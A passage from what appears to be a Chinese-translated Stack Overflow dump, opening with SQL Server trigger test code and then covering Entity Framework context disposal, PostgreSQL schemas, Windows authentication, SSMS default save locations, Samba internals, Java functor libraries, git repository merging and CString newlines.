        v1 = 
            CASE
            WHEN ISNULL(i.v1, '') != ISNULL(d.v1, '')
            THEN i.v1 + 'a'
            ELSE test2.v1 END,
        v2 = LEFT(i.v2, 5) + '|' + RIGHT(d.v2, 5),
        v3 = 
            CASE
            WHEN ISNULL(i.v3, '') != ISNULL(d.v3, '')
            THEN LEFT(i.v3, 5) + '|' + LEFT(i.v2, 5) + '|' + LEFT(i.v1, 5)
            ELSE test2.v3 END,
        d1 = 
            CASE
            WHEN ISNULL(i.d1, '1/1/1980') != ISNULL(d.d1, '1/1/1980')
            THEN DATEADD(dd, 1, i.d1)
            ELSE test2.d1 END,
        d2 = 
            CASE
            WHEN ISNULL(i.d2, '1/1/1980') != ISNULL(d.d2, '1/1/1980')
            THEN DATEADD(dd, DATEDIFF(dd, i.d2, d.d2), d.d2)
            ELSE test2.d2 END,
        d3 = DATEADD(dd, 15, i.d3)
    FROM test2
        INNER JOIN inserted i ON test2.t_id = i.t_id
        INNER JOIN deleted d ON test2.t_id = d.t_id

end

go

-----
-- the below code can be used to confirm that the triggers operated identically over both tables after a test
select top 10 test1.i1, test2.i1, test1.i2, test2.i2, test1.i3, test2.i3, test1.v1, test2.v1, test1.v2, test2.v2, test1.v3, test2.v3, test1.d1, test1.d1, test1.d2, test2.d2, test1.d3, test2.d3
from test1 inner join test2 on test1.t_id = test2.t_id
where 
    test1.i1 != test2.i1 or 
    test1.i2 != test2.i2 or
    test1.i3 != test2.i3 or
    test1.v1 != test2.v1 or 
    test1.v2 != test2.v2 or
    test1.v3 != test2.v3 or
    test1.d1 != test2.d1 or 
    test1.d2 != test2.d2 or
    test1.d3 != test2.d3

-- test 1 -- one column, one row
update test1 set i3 = 64 where t_id = 1000
go
update test2 set i3 = 64 where t_id = 1000
go

update test1 set i3 = 64 where t_id = 1001
go
update test2 set i3 = 64 where t_id = 1001
go

-- test 2 -- one column, 10000 rows
update test1 set v3 = LEFT(v3, 50) where t_id between 10000 and 20000
go
update test2 set v3 = LEFT(v3, 50) where t_id between 10000 and 20000
go

-- test 3 -- all columns, 1 row, non-self-referential
update test1 set i1 = 1000, i2 = 2000, i3 = 3000, v1 = 'R12345123', v2 = 'Happy!', v3 = 'I am v3!!!', d1 = '1/1/1985', d2 = '1/1/1988', d3 = NULL
where t_id = 3000
go
update test2 set i1 = 1000, i2 = 2000, i3 = 3000, v1 = 'R12345123', v2 = 'Happy!', v3 = 'I am v3!!!', d1 = '1/1/1985', d2 = '1/1/1988', d3 = NULL
where t_id = 3000
go

-- test 4 -- all columns, 10000 rows, non-self-referential
update test1 set i1 = 1000, i2 = 2000, i3 = 3000, v1 = 'R12345123', v2 = 'Happy!', v3 = 'I am v3!!!', d1 = '1/1/1985', d2 = '1/1/1988', d3 = NULL
where t_id between 30000 and 40000
go
update test2 set i1 = 1000, i2 = 2000, i3 = 3000, v1 = 'R12345123', v2 = 'Happy!', v3 = 'I am v3!!!', d1 = '1/1/1985', d2 = '1/1/1988', d3 = NULL
where t_id between 30000 and 40000
go

-----

drop table test1
drop table test2 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2015-08-14T06:31:29.757

我建议使用上面 Todd/arghtype 提到的 EXCEPT 集合运算符。

我添加了这个答案，因为我将“插入”放在“删除”之前，以便检测到插入和更新。所以我通常可以有一个触发器来涵盖插入和更新。也可以通过添加 OR (NOT EXISTS(SELECT * FROM inserted) AND EXISTS(SELECT * FROM deleted)) 来检测删除

它确定值是否仅在指定的列中发生更改。与其他解决方案相比，我没有调查它的性能，但它在我的数据库中运行良好。

它使用 EXCEPT 集合运算符返回左侧查询中未在右侧查询中找到的任何行。此代码可用于 INSERT、UPDATE 和 DELETE 触发器。

“PKID”列是主键。需要启用两个集合之间的匹配。如果您有多个主键列，那么您将需要包含所有列以在插入集和删除集之间进行正确匹配。

```
-- Only do trigger logic if specific field values change.
IF EXISTS(SELECT  PKID
                ,Column1
                ,Column7
                ,Column10
          FROM inserted
          EXCEPT
          SELECT PKID
                ,Column1
                ,Column7
                ,Column10
          FROM deleted )    -- Tests for modifications to fields that we are interested in
OR (NOT EXISTS(SELECT * FROM inserted) AND EXISTS(SELECT * FROM deleted)) -- Have a deletion
BEGIN
          -- Put code here that does the work in the trigger

END 
```

如果你想在后续的触发逻辑中使用更改的行，我通常会将 EXCEPT 查询的结果放入一个表变量中，以便以后可以引用。

我希望这很有趣:-)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2011-11-30T07:41:03.117

SQL Server 2008 中还有另一种用于更改跟踪的技术：

[比较变更数据捕获和变更跟踪](http://msdn.microsoft.com/en-us/library/cc280519(v=SQL.100).aspx)

# linq - 实体框架、Linq、ObjectContext 和延迟执行问题？

> ID：651526
> 
> 赞同：1
> 
> 时间：2009-03-16T18:05:52.367
> 
> 标签：linq, entity-framework

我是 Linq to EntityFramework 的新手，我在 Linq2EntityFramework 中遇到的一个问题是何时或是否要处置 ObjectContext。我问这个问题的原因是通常在我的 DAL 中我有类似的代码

```
public List<User>  GetUsers()
{
    using (MyEntities db = new MyEntities())   //where MyEntities inherits ObjectContext. 
    {

       // do some linq select operation which returns IQueryable<User>
       // call ToList() on the return IQueryable which is when the DB is really accessed
       // then we return List<User>

    } 
    // after using statement a Dispose method on ObjectContext is called, hence disposed the ObjectContext,  and in turn it closes my DB connection and releases it to the pool
} 
```

现在，我不想这样做，我希望我的 DAL 将 IQueryable 返回到我的 BLL 而不是 List，以便我的 BLL 可以在返回的 IQueryable 上执行类似 Skip() 的过滤，然后在 BLL 中调用 ToList()。所以代码变成了这样，

```
public IQueryable<User>  GetUsers()
{
   // do some linq select operation which returns IQueryable<User>
   // then just return what we got back
   // Note: no DB access occurred here, this is called deferred execution, because the real DB access happens later in BLL
} 
```

然后在我的 BLL 中，我有一个类似的方法

```
public List<User>  GetUsers()
{
   // get IQueryable<User> from DAL to a var say users     
    return  users.Skip(10).Take(20).ToList(); // here the DB access really happens.  Note: if we put using in DAL, here will throw exception saying DB is already closed!!
} 
```

我的问题是，

1.  如果我使用第二种方法，Linq2EF 会知道在上述方法完成后关闭我的连接吗？
2.  使用第二种方法，ObjectContext 永远不会被释放，这在大型站点上会是一个问题吗？
3.  或者我如何让 IQuerayable 回来但仍然在 DAL 中处理 ObjectContext？

非常感谢你，雷。

**编辑**：我不明白的一件事是，如果连接由 ObjectContext 巧妙地管理，那么不处理 ObjectContext 是否可以？除了 ObjectContext 之外，还有哪些其他东西可以管理？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-17T02:06:21.197

关于你的问题：

1.  它将关闭打开并关闭与 ToList 的连接，因为所有枚举都发生在那个地方。只有这样才能让您获得长时间打开的连接，如果您枚举它并为每个项目运行一些半长处理。
2.  对于正常的大型站点和正常操作，您会对此感到满意。可能让您陷入困境的主要事情是实体跟踪，它涉及您已加载的任何实体。如果您要加载太多信息或拥有一个非常大的站点，则可以避免使用它（不要为普通站点而烦恼）。
3.  您可以让您的数据访问类实现 IDisposable，并在释放数据上下文时释放它。因此，在您的 GetUsers 中，您可以在数据访问类周围使用 using。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:21:17.460

我倾向于将 EF ObjectContext*视为*解决此问题的 DAL。如果您希望自己的 DAL 封装 EF 的东西（这不是一个可怕的想法，IMO），我建议让您的 DAL 实现 IDisposable。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T18:26:57.230

如果你在一个网站的上下文中，你应该认真考虑让它在整个请求过程中你的 ObjectContext 是活跃的。

您需要保留 ObjectContext 以进行延迟加载，现在可以解决这个问题。

在查询和 SaveChanges 期间根据需要打开和关闭连接，因此您不应该有“连接泄漏”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T19:02:54.990

如果你想要 IQueryable 你可以通过查询 ToList() 结果并返回它来做到这一点

# asp.net - 使用 PostgreSQL 时，我应该在哪里（或如何）在 select 语句中定义模式？

> ID：651527
> 
> 赞同：0
> 
> 时间：2009-03-16T18:06:08.777
> 
> 标签：asp.net, postgresql, schema, npgsql

我有一个基于 ASP.NET 3.5 和 PostgreSQL 8.3 的应用程序。我的数据库有 3 个用户，一个数据所有者（xxx-owner）、一个数据编辑器（xxx-editor）和一个数据查看器（xxx-viewer）。每个用户都有自己的模式，称为 xxx-schema、xxx-editor-schema 和 xxx-viewer-schema。所有数据都存储在 xxx-schema 中。

这要求我在以 xxx-editor 或 xxx-viewer 用户身份连接到数据库时指定架构，如以下代码段所示。

```
NpgsqlCommand pgCommand = new NpgsqlCommand();
pgCommand.CommandText = @"SELECT 
                        bldg_id,
                        bldg_name,
                        bldg_no,
                        FROM " + this.schema + @".buildings
                        WHERE UPPER(bldg_id) LIKE UPPER(@id);";

pgCommand.Parameters.Add("@id", "%" + id + "%");
pgCommand.Connection = pgConnection; 
```

如果我要遵循这条路线，我会在 Web.config 中指定架构。但是，必须有更好的方法来指定应该使用哪个模式。如果可能的话，我希望能够完全删除字符串连接。

定义要在 SQL 语句中使用的模式的最佳方法是什么？

* * *

*编辑*

[PostgreSQL 用户手册](http://npgsql.projects.postgresql.org/docs/manual/UserManual.html)中的以下内容看起来很有希望。

> SearchPath - 将搜索路径更改为指定和公共架构。

从我有限的测试来看，它在我的情况下可以正常工作。然而，这是一个 PostgreSQL 唯一的解决方案。是否有更多与数据库无关的解决方案，大多数数据库是否提供了这样的功能？

* * *

*编辑 2*

我在下面标记了答案，这导致我在数据库级别更改架构查找顺序。通过以下更改，我不需要在我的 SQL 语句中添加代码。

```
ALTER USER xxx-viewer SET search_path TO '$user', xxx, public, sde 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T19:02:25.350

您可以使用以下方法在每个会话的基础上设置架构搜索路径：

```
SET search_path TO myschema 
```

如果你想回退到公共模式，你可以使用：

```
SET search_path TO myschema, public 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-12T22:21:28.087

你也可以这样做：

SET SCHEMA 'myschema';

这句话是一样的，`SET search_path TO myschema, public`但更多

# asp.net - Intranet/Internet 的 Windows 身份验证

> ID：651531
> 
> 赞同：13
> 
> 时间：2009-03-16T18:07:40.550
> 
> 标签：asp.net, authentication, windows-authentication, intranet

我正在为我的公司开发一个 ASP.net Web 应用程序。有些用户在内部网络（Intranet）中使用这个站点，有些用户使用 Internet 站点。我正在使用 Windows 身份验证模式。

我需要找到一种方法，**不对**Intranet 用户**提示**Windows 身份验证模式，而对 Internet 用户提示 Windows 身份验证模式。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-03-16T18:58:02.287

根据您的描述，IIS 中的 Windows 身份验证可以解决问题。

首先是一些链接：

*   Technet 作为关于[IIS 中的 Windows 身份验证的文章在这里](http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/5f8fe119-4095-4094-bba5-7dec361c7afe.mspx?mfr=true)
*   MSDN[在这里告诉您如何将 Windows 身份验证与 ASP.NET 2.0 应用程序一起使用](http://msdn.microsoft.com/en-us/library/ms998358.aspx)

但是请注意以下几点：

如果满足以下所有条件，将发生单点登录 (SSO)（即在不提供用户名和密码的情况下访问应用程序）：

*   客户端计算机和服务器属于同一个 Active Directory 域。
*   客户端计算机上的用户会话是来自 AD 域的用户。
*   客户端计算机可以访问域服务器（即负责用户登录的服务器）
*   浏览器是 Internet Explorer。
*   使用的 URL 指向服务器的 FQDN（即[http://SERVERNAME.DOMAIN.NAME/](http://SERVERNAME.DOMAIN.NAME/)而不仅仅是[http://SERVERNAME/](http://SERVERNAME/)
*   如果您使用模拟，授权用户必须具有对应用程序目录的读取权限。该应用程序将基本上使用他们的凭据运行。（更多详情见[MSDN 文章](http://msdn.microsoft.com/en-us/library/ms998358.aspx)）

在任何其他情况下，系统都会提示用户输入 Active Directory 域中帐户的凭据（用户名和密码）。因此，从互联网访问您的网络服务器的用户会收到一个弹出窗口，要求他们提供用户名和密码。

请注意，对于不使用单点登录的用户（提示用户输入用户名和密码），HTTP 身份验证模式很可能是 BASIC，这意味着任何可以拦截该连接的人都可以看到正在交换的用户名和密码。如果您使用这种技术，请确保客户端和服务器之间的连接是加密的（HTTPS 或者可能是 VPN）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T19:47:15.197

确保您的 Web 服务器在域上运行，并且您的所有 Intranet 用户都具有对 Web 服务器上包含您的网站的文件夹的读取权限。

然后，确保您的 web.config 中有（假设您想检测哪个域用户正在访问您的站点。

最后，打开 IIS 管理器并右键单击该网站并选择“属性”。从那里单击“目录安全”选项卡，然后单击“身份验证和访问控制”中的“编辑”。取消选中“匿名访问”并确保选中“集成 Windows 身份验证”。这应该使网站按预期运行（假设您的 Intranet 客户端使用 IE）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T18:46:18.133

据我所知，Windows 身份验证只能用于 Intranet，但您也可以包括表单身份验证来对 Internet 用户进行身份验证。[此页面](http://forums.asp.net/t/1223136.aspx)包含一些信息和有关如何执行此操作的教程的链接。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T18:47:19.490

我可能会将应用程序部署在两个不同的服务器上。防火墙内的服务器上的 Windows 身份验证，Windows 身份验证用户可以访问和使用该服务器。在公众面前，您将 Web 配置设置为使用表单身份验证，然后担心保护与后端的连接。

但是，如果您想为此使用单个服务器，您可能需要阅读此 MSDN 文章：[Mixing Forms and Windows Security in ASP.NET](http://msdn.microsoft.com/en-us/library/ms972958.aspx)

# sql-server - Management Studio 默认文件保存位置

> ID：651535
> 
> 赞同：65
> 
> 时间：2009-03-16T18:09:04.930
> 
> 标签：sql-server, ssms

打开一个新的查询窗口。写一些SQL。保存脚本，将打开“将文件另存为”对话框 - 但始终位于 Profiles 目录中的相同默认位置。有没有办法设置我的默认文件位置？...就像我过去使用 1980 年代的应用程序一样？

在工具|选项下，可以为查询结果指定默认位置。对于新查询（文本编辑器），我需要同样的东西。尝试更改注册表中的位置，但 SSMS 只是覆盖了我的更改。有什么建议么？

[（我在http://www.eggheadcafe.com/software/aspnet/30098335/management-studio-default.aspx](http://www.eggheadcafe.com/software/aspnet/30098335/management-studio-default.aspx)看到了这个未回答的问题， 我也有同样的问题，所以我只是在这里重新发布）

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2015-01-07T23:22:14.377

现在已经有 5 年历史了，但它没有提到 SSMS 版本，所以我想我会为 SSMS 2012 和 SSMS 2014 添加更新。第一步在版本之间有所不同，然后其余部分相同：

**SSMS 2012**

1.  找到 C:\Program Files (x86)\Microsoft SQL Server\110\Tools\Binn\ManagementStudio\Extensions\Application

**SSMS 2014**

1.  找到 C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Extensions\Application

**SSMS 2016**

1.  找到 C:\Program Files (x86)\Microsoft SQL Server\130\Tools\Binn\ManagementStudio\Extensions\Application

**SSMS 17**

1.  找到 C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\ManagementStudio\Extensions\Application

**SSMS 18**

1.  找到 C:\Program Files (x86)\Microsoft SQL Server Management Studio 18\Common7\IDE\Extensions\Application

**全部（续）**

2.  使用文本编辑器（例如记事本）打开 ssms.application.pkgdef
3.  更改 DefaultProjectsLocation "DefaultProjectsLocation"="$MyDocuments$\SQL Server Management Studio" 的值
4.  对于查询存储位置（查询本身，而不是结果），编辑：“DefaultUserFilesFolderRoot”=“SQL Server Management Studio”
5.  保存文件

感谢这个来源：[http ://www.networksteve.com/forum/topic.php/How_to_change_the_default_query_save_location_in_SSMS/?TopicId=41425&Posts=0](http://www.networksteve.com/forum/topic.php/How_to_change_the_default_query_save_location_in_SSMS/?TopicId=41425&Posts=0)

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2011-07-14T13:32:29.030

我知道这是一个老问题，但我发现一个链接解释了如何正确执行此操作，至少对于 SQL 2005 而言。认为它也适用于更高版本。

[更改我的项目文件夹](https://web.archive.org/web/20110829003107/http://visualstudiohacks.com/options/changing-the-my-projects-folder-location-and-other-settings-in-ssms//)

> 设置存储在文件夹中的`.vssettings`XML 文件中`My Documents\SQL Server Management Studio\Settings`。确保在更改此文件之前关闭 SSMS：当您关闭应用程序时，SSMS 会写入它，并将覆盖您所做的任何更改。要更改 `My Projects`文件夹，您正在寻找这一行：

```
 <PropertyValue name="ProjectsLocation">%vsspv_user_documents%\My
   Projects</PropertyValue> 
```

> 里面的值是`My Projects`文件夹的位置。只需更改值，下次打开 SSMS 时，`My Projects` 文件夹就会被映射。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-06-20T13:12:42.883

一个简单的解决方法是创建指向所需保存位置的快捷方式。将快捷方式放在 SSMS\Projects 目录中。保存时，选择底部的“所有文件（*.*）”，然后双击您的快捷方式。

不理想，但可以快速简单地解决。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-03-17T12:46:39.940

只是为了确保，您是否在此处更新了注册表中的位置：

```
HKEY_CURRENT_USER\Software\Microsoft\Microsoft SQL Server\90\Tools\Shell

HKEY_CURRENT_USER\Software\Microsoft\Microsoft SQL Server\90\Tools\Shell\General\ProjectLocationEntries 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2019-06-20T00:01:05.053

**SSMS 18**的安装位置以及控制默认文件保存位置的配置文件的位置已更改。需要编辑的文件现在位于以下路径：

**C:\Program Files (x86)\Microsoft SQL Server Management Studio 18\Common7\IDE\Extensions\Application\ssms.Application.pkgdef**

1.  关闭所有正在运行的 SSMS 18 实例。

2.  使用以管理员权限运行的文本编辑器打开 ssms.Application.pkgdef。

3.  将 DefaultProjectsLocation 的值更改为您希望的默认值：

    *   "DefaultProjectsLocation"="C:\My\Preferred\Save\Location"
4.  保存文件并重新启动 SSMS。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-16T20:47:28.530

作为一种解决方法，您可以在要存储脚本的位置创建 SQLServerScripts 类型的新项目。

然后在解决方案资源管理器中，只需右键单击查询文件夹即可在您指定的位置创建一个新脚本。

有道理？

有关 SQL Server 中的项目和解决方案的更多详细信息，请参阅：

[http://msdn.microsoft.com/en-us/library/ms173803.aspx](http://msdn.microsoft.com/en-us/library/ms173803.aspx)

干杯，

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2011-07-14T14:04:21.617

另一种方法可能是创建 NTFS 连接点。

[获取Systinternals Suite](http://technet.microsoft.com/en-gb/sysinternals/bb842062 "系统内部套件")的副本，您需要其中的 junction.exe，其他内容也很有用。

在命令行中运行它：

```
junction.exe "c:\MyStuff" "c:\Documents and Settings\Stephen.Turner\My Documents\SQL Server Management Studio" 
```

放入*您的*“我的文档”路径。

将创建目录 c:\MyStuff，当您浏览到它时，您会看到所有文件。它不是副本而是符号链接，两个路径都引用相同的文件。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2011-07-21T16:31:27.527

我对此没有任何运气，我的解决方案是使用 .bat 文件创建一个新的 empty.sql 文件，然后打开它。然后在 SSMS 中，我使用“外部工具”来重新批处理。单击它并打开一个新的带时间戳的 .sql 文件。我为每个“项目”使用一个

创建一个 .bat 文件

```
set fName=newQuery%date:~4,2%_%date:~7,2%_%date:~10,4%_%time:~1,1%_%time:~3,2%_%time:~6,2%.sql
copy _queryBlank.sql %fName% 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2012-11-20T12:25:17.480

在过去 3 小时搜索此主题后，我终于找到了执行此操作的方法：[在 SSMS 中更改我的项目文件夹位置（和其他设置）](http://visualstudiohacks.com/options/changing-the-my-projects-folder-location-and-other-settings-in-ssms/)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2010-04-14T11:30:44.733

注册表更改对我不起作用。我只是在 Mgnt Studio 默认保存路径中放置了我想使用的网络文件夹的快捷方式。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-11-09T16:36:32.877

[这篇文章](http://csc-technicalnotes.blogspot.com/2009/09/sql-server-management-studio-default-my.html)展示了一种方法。

但是，它的基于注册表的解决方案仍然存在差距......当一个人保存新创建的查询时（在我的 SSMS 2008 设置中，我在启动时打开它），他必须单击左侧的“项目”，因为保存对话框打开在标准 ...\Documents\SQL Server Management Studio\Projects 中。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-07-13T22:01:52.397

帮助我的是编辑注册表和 DefaultFileOpenLocation 的值

```
HKEY_USERS\S-1-5-21-1428394981-1396028598-1721912238-1000\Software\Microsoft\SQL Server Management Studio\18.0_IsoShell 
```

[注册表编辑器屏幕截图：](https://i.stack.imgur.com/tJRrE.jpg)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-11-09T14:31:52.353

1.  在对象资源管理器中，右键单击您的服务器并单击**属性**。

2.  在该属性页面的左侧面板中，单击**数据库设置**选项卡。

3.  在数据库默认位置中，查看新数据文件和新日志文件的当前默认位置。要更改默认位置，请在数据或日志字段中输入新的默认**路径名**，或单击浏览按钮查找并选择路径名。

**注意**：更改默认位置后，您必须停止并启动 SQL Server 服务才能完成更改。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2017-03-01T16:42:27.710

一个低技术但快速的解决方案是简单地在默认文件夹中创建一个快捷方式，指向您要保存脚本/结果/等的文件夹。这是一个额外的点击，但不会弄乱设置或注册表。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2017-04-28T14:28:48.283

对我来说最简单的解决方案是更改注册表中的文件夹（使用 SQL Server 2014 测试）

确保之前关闭 SQL Server Management Studio

1.  启动 regedit.exe
2.  浏览到 Computer\HKEY_CURRENT_USER\Software\Microsoft\SQL Server Management Studio\xx.0（其中 xx 是您的版本）
3.  更改您在其中看到的不同位置路径
4.  启动 Management Studio 并尝试打开一个文件，默认目录将是你的

但是，我仍然存在的唯一问题是 Save...在左侧，您将直接进入您的目录。

![](https://i.stack.imgur.com/9VGew.png)

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2018-03-22T15:46:14.107

您可以使用 mklink 创建符号链接。

1.  删除现有项目文件夹（先将现有文件复制到首选位置）：rmdir "C:\Users\ **user** \Documents\SQL Server Management Studio\SSMS Projects)。
2.  创建指向首选位置的符号链接（例如 onedrive 文件夹）： mklink /j "C:\Users\ **user** \Documents\SQL Server Management Studio\SSMS Projects" "C:\Users\ **user** \OneDrive - Company\SSMS Projects"

/j 选项指定一个硬链接，使它看起来好像文件或文件夹实际存在于该位置。当您尝试在 SSMS 中打开文件时，文件夹现在应如下所示：

[SSMS 中的示例硬链接](https://i.stack.imgur.com/yE98Y.jpg)

# c - Hacking samba - 如何从 struct fd_handle 获取目录

> ID：651537
> 
> 赞同：1
> 
> 时间：2009-03-16T18:09:33.153
> 
> 标签：c, samba

我正在破解一些 samba 内部结构，并且我想记录 read_file 和 write_file 中写入的内容，确切地说我想获取文件名、目录以及写入的字节数。

在 struct files_struct 中，定义了文件名 (char* fsp_name)，我可以计算写入字节数，但在 files_struct 中没有带目录的字段。

有什么办法，如何确定在 samba 胆量中打开文件的目录？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-18T01:42:37.027

假设`char* fsp_name`包含完整文件（而不是相对名称），您可以使用`strpbrk ()`（man 3 strpbrk）吗？循环搜索“/”，直到它返回`NULL`。然后你的目录是从 fsp_name 到它最后一次返回的指针。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-23T23:37:09.407

好的，所以 - 解决方案：files_struct 包含 'conn' 字段，其中有 'char * origpath' - 包含当前文件的目录。

# asp.net - ViewState 不会保留变量和错误

> ID：651538
> 
> 赞同：0
> 
> 时间：2009-03-16T18:09:34.290
> 
> 标签：asp.net, iis, iis-7, viewstate

让我看看我是否可以更好地重新措辞，也许会得到一些更相关的答案或想法。正如用户报告的那样，这种情况现在已经发生了几次。我无法在我的本地服务器上重现。我现在正在检查每个 IIS 设置以确保它们匹配。

但在我们的生产服务器上，详细信息如下：

单服务器

无身份验证

IIS7

ASP.NET 3.5

发生时完全随机

使用 ViewState

有任何想法吗？事件日志中的实际错误！

* * *

我的事件日志有以下错误：

事件代码：4005

事件消息：请求的表单身份验证失败。原因：提供的票已过期。

活动时间：14/03/2008 13:19:26

活动时间（UTC）：14/03/2008 13:19:26

事件 ID：d9f0333c2eed46e0b0207da69d2ea70e

事件序列：154

事件发生：5

活动详情代码：50202

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T18:24:18.437

检查接受的解决方案： [http ://www.experts-exchange.com/Programming/Languages/.NET/ASP.NET/Q_21968000.html](http://www.experts-exchange.com/Programming/Languages/.NET/ASP.NET/Q_21968000.html)

如果身份验证票过期，您可能会遇到该错误。

# java - 最佳 Java Functor lib：JGA、commons functor、mango 还是...？

> ID：651541
> 
> 赞同：7
> 
> 时间：2009-03-16T18:09:58.847
> 
> 标签：java, functor

我对在 Java 中使用仿函数（函数对象）很感兴趣。通过快速谷歌搜索，我找到了这 3 个包：

*   Java 泛型算法：http: [//jga.sourceforge.net/](http://jga.sourceforge.net/)
*   Commons 函子：[http ://commons.apache.org/sandbox/functor/](http://commons.apache.org/sandbox/functor/)
*   芒果： http: [//www.jezuk.co.uk/cgi-bin/view/mango](http://www.jezuk.co.uk/cgi-bin/view/mango)

和 3，JGA 似乎它可能有最好的设计。但我怀疑这里实际使用过一个或多个包的其他人可能能够提供更多关于这些（可能还有其他）函子包的优缺点的见解。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-10-17T02:55:23.357

## 芒果

为 0、1 和 2 参数函数提供接口。使用 Java 泛型。用于处理函数的各种算法。

## JGA

为 0、1、2 和任意数量的参数函数提供类。域对象是这些的子类。使用 Java 泛型。广泛的算法。包括 JFXG (Java Functor eXpression Grammar) - 一种经过解析的语言，旨在使创建任意复杂的仿函数变得容易。提供多种算法来处理函数。

## Apache Commons 函子

为 0、1 和 2 参数函数以及 0、1 和 2 参数过程（不返回值）提供接口。使用 Java 泛型。良好的算法范围。

## 谷歌番石榴（谷歌收藏）

为单参数函数提供函数和谓词接口。使用 Java 泛型。仅提供组合函数的 compose 方法。很基本。

## 功能J

为 0、1、2 和任意数量的参数函数提供接口和类。使用 Java 泛型。现有方法可以通过提供的函数反射类转换为函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-08-21T01:39:29.127

我希望我不会因为说函数对象不是函子而冒犯任何人。在维基百科上查找函子。请停止滥用这个术语。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T18:17:52.367

[Google Collections Library](http://code.google.com/p/google-collections/)提供了一个`Function`类似的界面（尽管可能没有那么深入）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-12-21T18:35:15.153

swensen.functional，[http://www.codeproject.com/KB/java/FunctionalJava.aspx](http://www.codeproject.com/KB/java/FunctionalJava.aspx)，由 Yours Truly 提供。

提供封装 0 到 5 个参数函数 (FuncX) 和过程 (ActionX) 的单一方法通用接口。还包括一个 Predicate 仿函数（实现 Func2<T,Boolean> 的抽象类）和其他三个为与旧版 Comparator、Runnable 和 Callable 仿函数兼容而设计的。为了让这一切变得有用，一个不可变的 Iterable 类型（可从所有数组和 Iterables 构造）具有方法链接、惰性求值和功能投影（如过滤器、映射和折叠）。

优点：简单而有效，没有破坏 fp 精神的复杂类型层次结构。
缺点：新的，尚未经过实战测试。

# git - 两个结构相同的 git repos 可以在没有任何共同历史的情况下合并吗？

> ID：651542
> 
> 赞同：8
> 
> 时间：2009-03-16T18:10:04.727
> 
> 标签：git, merge, repository

我有两个小的 git repos。这些项目都从不同的点开始，但收敛到一个非常相似的点（相同的文件名、文件夹结构等）。一个不是另一个的分支，但一个可以被认为是另一个的进化。

如果我可以将两者合并，那就太好了，这`repo2`就是`repo1`. 这可能吗，同时将历史添加`repo2`到 's 的末尾`repo1`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T18:30:11.387

您可以将[一个放入另一个](http://kerneltrap.org/mailarchive/git/2007/12/9/484781)：

```
$ cd project1
$ git config remote.project2.url /path/to/project2
$ git config remote.project2.fetch 'refs/heads/*:refs/project2/*'
$ git fetch project 
```

这将为您提供两个（或更多）分支，其中包含 project1 和 project2 的历史记录。它们仍然是完全独立的，只是使用相同的对象存储。

然后（未测试），您可以使用**移植文件**（`.git/info/grafts`），您可以在其中覆盖提交的父级（例如 project2 的第一个具有最新的 project1 的父级）

正如[达斯汀](https://stackoverflow.com/users/39975/dustin)在评论中所说，为了“使其永久化”，通过将 project2 提交重播到 project1 来进行 rebase。

* * *

[您在“在项目中使用 Git (forking around)](http://drnicwilliams.com/2008/02/03/using-git-within-a-team/) ”博客条目中还有另一个说明，尤其是“如何拉朋友和影响他人”部分。再次：

```
git checkout two_point_ooh
git remote add strelau git://gitorious.org/ruby-on-rails-tmbundle/mainline.git
git checkout -b strelau/two_point_ooh
git pull strelau two_point_ooh 
```

是一个类似的过程，但对于分叉的存储库（这不完全是你的情况）

# c++ - CString 中的转义字符

> ID：651544
> 
> 赞同：1
> 
> 时间：2009-03-16T18:10:40.637
> 
> 标签：c++, newline, cstring

如何将转义字符（如换行符 -- \n）放入 CString？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T18:27:00.350

> \n 变成一个盒子（垃圾字符）。它不会插入新行。

这是您在调试器中找到的吗？如果是这样，这没关系。换行符的十六进制值为 0xA 或十进制的 10。由于这是一个不可打印的字符，这就是调试器将向您显示的内容。

除此之外，如果您使用记事本查看输出，则可能无法正确显示。尝试“\r\n”以使记事本正确拆分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T18:21:12.483

我认为您的问题不是在 CString 中插入换行符，而是在您用来显示字符串的方法中

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T19:48:29.577

